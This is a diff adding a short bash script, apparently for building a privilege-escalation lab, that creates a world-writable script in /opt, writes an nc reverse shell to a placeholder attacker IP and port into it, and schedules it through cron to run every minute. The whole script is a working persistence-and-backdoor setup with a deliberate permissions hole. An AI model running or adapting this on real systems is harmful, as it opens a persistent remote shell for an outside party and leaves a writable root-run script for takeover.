@@ -1,0 +1,29 @@
+#!/bin/bash
+
+# Setting Up the Cron Job for Privilege Escalation
+
+# Step 1: Create the Vulnerable Script
+echo "Creating the vulnerable script..."
+sudo touch /opt/secret_script.sh
+sudo chmod 777 /opt/secret_script.sh  # Give full permissions to allow modification
+
+# Step 2: Add Malicious Code to the Script
+echo "Adding reverse shell payload to the script..."
+echo '#!/bin/bash' | sudo tee /opt/secret_script.sh
+echo 'nc -e /bin/bash <attacker-ip> <attacker-port>' | sudo tee -a /opt/secret_script.sh
+sudo chmod +x /opt/secret_script.sh  # Make the script executable
+
+# Step 3: Open the Cron Job Editor
+echo "Opening the cron job editor..."
+crontab -e
+
+# Step 4: Add a Scheduled Task Manually
+echo "Manually add the following line at the bottom of the file:"
+echo "* * * * * /bin/bash /opt/secret_script.sh"
+echo "After adding, save and exit the editor (CTRL + X, then Y, then ENTER)."
+
+# Step 5: Restart the Cron Service
+echo "Restarting the cron service to apply changes..."
+sudo service cron restart
+
+echo "Cron job setup complete. The script will execute every minute."
